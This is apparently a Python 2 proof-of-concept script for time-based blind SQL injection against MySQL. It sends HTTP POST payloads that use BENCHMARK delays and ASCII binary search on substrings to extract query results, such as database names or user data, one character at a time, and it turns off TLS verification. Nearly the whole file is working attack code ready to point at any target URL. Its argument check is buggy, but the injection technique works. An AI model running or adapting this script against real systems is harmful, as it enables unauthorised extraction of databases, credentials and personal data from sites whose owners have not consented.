################################################################################################
#  Description:  
#  A rough HTTP POST based POC for dumping results from an MySQL database using timed based
#  SQL injection.
#
#  Author: b0yd
#
################################################################################################

import requests
import urllib
import time
import sys
import math

proxies = None
#Comment out if not using a proxy like Burp, etc
proxies = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080',
}

if len(sys.argv) < 1:
  print "Usage: python poc.py <SQL Query>"
  sys.exit(1)
  
query = sys.argv[1]

#Example User Agent string
headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
           'Content-Type':'application/x-www-form-urlencoded'}
           
#Set to bypass errors if the target site has SSL issues
requests.packages.urllib3.disable_warnings()

#Set this to the parameter name for the POST request
post_param_name = ""

#Target URL
url = "https://example.com"

#Set this to the beginning ascii ordinal value, ie 41=A
begin_num = 32
#Set this to the end ascii ordinal value, ie 41=A
end_num = 127

#SQL query to execute
#query = "select database()"

#Can be used to find the length of the returned SQL string
def get_str_length(query, start_ord, end_ord):

  s = start_ord
  e = end_ord 
  res_len = 0
  mid = 0
  
  #Update mid point
  while True:
    diff = e - s
    if s == end_ord:
      print "[-] Length not found. Exiting"
      res_len = 0
      break
    elif diff == 0:
      res_len = s
      break
          
    #Set mid point 
    mid = int(math.floor(diff/2)) + s    
    print "[+] Current ret query length: %d" % mid
  
    #for i in range(0, 1000):
    data = "1' AND length((%s))>%d AND BENCHMARK(10000000,MD5(1))-- " % (query, mid)
    ret_tuple = make_request(url, data)	  
      
    #Print elapsed time
    req_time = ret_tuple[1]
    print req_time   

    #Query succeeded
    if req_time > 4:
      #Move the range past the mid point
      s = mid + 1        
    elif "error" in ret_tuple[0]:
      print "[-] SQL syntax error"
      break
    else:   
      #Move the range past to mid point
      e = mid

  return res_len

def make_request( addr, data ):      
        
  #add post data
  p_data = {post_param_name : data}
  
  #Setup request
  r = requests.post(addr, data = p_data, proxies=proxies, verify=False, headers=headers)
  req_time = (r.elapsed.total_seconds())
  return r.text,req_time

#Read file
def get_string(str_len, query, start_ord, end_ord):

  full_str = ''
  counter = 1
  while( len(full_str) < str_len ):

    s = start_ord
    e = end_ord 
    letter_found = False
    mid = 0
    
    while True:
    
      #Update mid point
      diff = e - s
      if s == end_ord:
        print "[-] Letter not found. Exiting"
        break
      elif diff == 0:
        full_str += chr(s)
        counter += 1
        letter_found = True
        break  
      
      #Set mid point 
      mid = int(math.floor(diff/2)) + s    
      print "[+] Current ASCII char: %d" % mid
      
      #Construct query
      data = "1' AND (ascii(substr((%s),%s,1))) > %d AND BENCHMARK(10000000,MD5(1))-- " % (query, counter, mid)
      ret_tuple = make_request(url, data)	  
      
      #Print elapsed time
      req_time = ret_tuple[1]
      print req_time   

      #Query succeeded
      if req_time > 4:
        #Move the range past the mid point
        s = mid + 1        
      elif "error" in ret_tuple[0]:
        print "[-] SQL syntax error"
        break
      else:   
        #Move the range past to mid point
        e = mid
		
    print full_str
    #sys.exit(1)


    if letter_found == False:
      print "[-] Letter not found. Exiting"
      break

  return full_str
  
#Print the query
print "[+] Running query: '%s'" % query
#str_len = 100000

#Uncomment below to find the SQL return length before trying to get the actual value
str_len = get_str_length(query, 0, 100)

print "[+] Length: %d" % str_len
if str_len > 0:
  user = get_string(str_len, query, begin_num, end_num)
  print "[+] Result: %s" % user
